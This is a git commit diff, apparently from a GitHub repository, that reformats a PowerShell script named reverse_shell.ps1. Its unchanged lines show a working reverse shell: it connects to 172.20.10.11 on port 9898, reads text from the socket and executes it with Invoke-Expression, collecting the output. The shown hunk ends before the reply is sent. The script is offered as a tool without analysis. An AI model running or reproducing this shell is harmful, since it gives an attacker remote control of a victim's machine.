59edfedeb9a02f419f084b0a7ccbfb193361be8c
Martins <94647646+Saul-Martins@users.noreply.github.com>
2024-12-26 14:26:53 -0300

    Update reverse_shell.ps1

--- reverse_shell.ps1
+++ reverse_shell.ps1
@@ -1,15 +1,13 @@
-$ip = "172.20.10.11" 
-$port = 9898  
+$ip = "172.20.10.11"
+$port = 9898
 
 $tcp = New-Object System.Net.Sockets.TCPClient($ip, $port)
 $stream = $tcp.GetStream()
 
 [byte[]]$bytes = 0..255 | ForEach-Object { 0 }
 while ($true) {
-   
     $i = $stream.Read($bytes, 0, $bytes.Length)
     if ($i -eq 0) { break }
-    
     
     $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
     $sendback = (Invoke-Expression $data 2>&1) | Out-String
